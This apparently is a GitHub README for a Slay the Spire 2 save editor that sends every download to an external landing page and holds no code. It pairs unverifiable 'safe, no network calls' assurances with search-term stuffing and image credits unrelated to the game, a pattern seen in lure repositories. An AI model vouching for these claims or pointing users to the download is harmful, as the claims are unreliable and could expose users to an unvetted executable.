![Slay the Spire 2 Save Editor]

# Slay the Spire 2 Save Editor 2026

**Edit your STS2 save file safely. Unlock all cards, edit gold, max relics. 100% external. No game memory modification.**

[![Download](https://img.shields.io/badge/download-landing%20page-E8B44A?style=flat-square)](https://ShadowDepict.github.io/slay-the-spire-2-save-editor/)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%2F%2011-3B4C8F?style=flat-square)](https://ShadowDepict.github.io/slay-the-spire-2-save-editor/)
[![Version](https://img.shields.io/badge/version-1.0.0-8B5CF6?style=flat-square)](https://ShadowDepict.github.io/slay-the-spire-2-save-editor/)
[![License](https://img.shields.io/badge/license-MIT-4FD1A5?style=flat-square)](LICENSE)

---

## Overview

A desktop editor for the save files of Slay the Spire 2, the card roguelike that entered early access on 5 March 2026. It opens the profile document sitting in your own save folder, lists the values it found, and writes back only the fields you change: cards, gold, max HP, potion slots and relics.

The point is to skip the grind you have already done once. If you want to test a deck idea, replay an act with a different relic set, or simply not farm gold for an evening, the editor does that in a few clicks instead of an evening of runs.

It reads and writes a local `.save` file. It does not attach to the running game, does not read process memory, and does not need the game to be open. Everything works offline.

## Features

| Panel | What it does | Why it matters |
|---|---|---|
| **Unlock cards** | Adds any of the 566 cards to your deck or collection, per class or all at once. | Try the deck you were missing one card for, today. |
| **Edit gold** | Sets your gold to any value the save format accepts, from pocket change to a full shop sweep. | Removes the part of a run that is just walking back to a merchant. |
| **Max relics** | Adds every relic in the game to your inventory, or removes the ones you never pick. | Build the run you want to test instead of the one the RNG gave you. |
| **Edit HP** | Sets current and max HP, plus potion slot count. | Recover a run you want to finish, or set up a low-HP challenge on purpose. |
| **Auto backup** | Copies the original save next to it before the first write, with a timestamp. | One bad edit never has to cost you the profile. |
| **Portable settings** | A plain text file beside the app remembers your last folder and last slot. | No installer, no registry, no account. |

![Card editing]

## How it works

1. **Download from the landing page.** Open [the landing page](https://ShadowDepict.github.io/slay-the-spire-2-save-editor/) and use the download button there. The current build, version notes and unpacking instructions live on that page.
2. **Unpack the folder.** No installer and no admin rights. Keep the folder together; settings are written next to the app.
3. **Close the game, then point the editor at your save folder.** The usual path is under your user profile in the game's `saves` directory. The editor shows the slots it finds.
4. **Change what you want and write.** The editor keeps a timestamped copy of the original first, then writes the file. Start the game and load the run.

![Gold editing]

## Safety notice

This tool edits local `.save` files only. It does not touch game memory or any background monitoring. 100% safe for single-player.

- No process is attached, opened or injected into.
- No memory is read or written while the game runs.
- No driver, service or background updater is installed.
- No account, no telemetry, no network calls.
- Uninstalling means deleting the folder.

Slay the Spire 2 is a single-player game, so a save edit affects only your own copy of the run. Keep the backup the editor makes until you are sure the run loads the way you wanted.

![Relic editing]

## Requirements

| | |
|---|---|
| OS | Windows 10 or Windows 11, 64-bit |
| Game | Slay the Spire 2 (early access), any current build |
| Storage | One small folder plus the automatic save backups |
| Network | Not required; the editor works fully offline |
| Account | Not required |

## FAQ

<details>
<summary>Is this safe?</summary>

Yes. It is a save editor: it reads and writes a local file that you already own. It does not run alongside the game, does not touch memory and does not install anything. The worst realistic outcome is a malformed save, which is why the editor copies the original before every write.
</details>

<details>
<summary>Does it work offline?</summary>

Completely. There is no login, no licence check and no update ping. Disconnect the machine and every feature still works.
</details>

<details>
<summary>Will I get banned?</summary>

STS2 is single-player with no server-side review of your save, so there is no ban system to trigger. Your edits stay in your own file.
</details>

<details>
<summary>Can it break my run?</summary>

A save written with impossible values can fail to load or behave oddly. The editor keeps a timestamped backup of the file it replaced, so restoring the previous state is copying one file back.
</details>

<details>
<summary>Do I need the game installed to edit a save?</summary>

No. The editor works on the file. It is convenient to have the game closed while you edit, so the running process does not overwrite your changes on exit.
</details>

<details>
<summary>Does it work with cloud saves?</summary>

It edits the local file. If your platform syncs that folder, let the sync finish after you write, or pause sync while editing, so the older cloud copy does not replace your changes.
</details>

<details>
<summary>Will it survive game updates?</summary>

The save format can change between early access builds. If a build changes the layout, the editor reports that it cannot parse the file instead of writing a guess. Check the changelog on the landing page after a big patch.
</details>

## Download

Everything ships through the landing page: [**ShadowDepict.github.io/slay-the-spire-2-save-editor**](https://ShadowDepict.github.io/slay-the-spire-2-save-editor/). That page carries the current build, the version number and the unpacking instructions. This repository holds the documentation and the project page, so a link here would go stale the moment a new build lands.

## Search terms

slay the spire 2 save editor, sts2 save editor, slay the spire 2 editor, unlock all cards slay the spire 2, sts2 gold editor, sts2 relics, savegame editor, slay the spire 2 tool, sts2 2026, slay the spire 2 early access

## Disclaimer

Unofficial fan project. Not affiliated with, endorsed by or sponsored by Mega Crit or Paradox Interactive. Slay the Spire is a trademark of its respective owners. The editor works on local save files that you already own and is intended for your own single-player copy. Progress edits are for personal use; do not use them to misrepresent records in community ladders or organised events. Always keep a backup. Use at your own risk.

Photography: Chester Cathedral nave by Michael D Beckwith (CC0); cathedral tower at night by Paul Colin Hennig (CC BY-SA 4.0); tarot spread with candles by Nosferattus (CC0); Bactrian gold coin, Eucratides I / BnF (public domain); Lough Erne shrine by Ceoil (CC BY-SA 4.0); candle flames by Upcomingphotographerscorner (CC BY-SA 3.0). All images sourced from Wikimedia Commons.
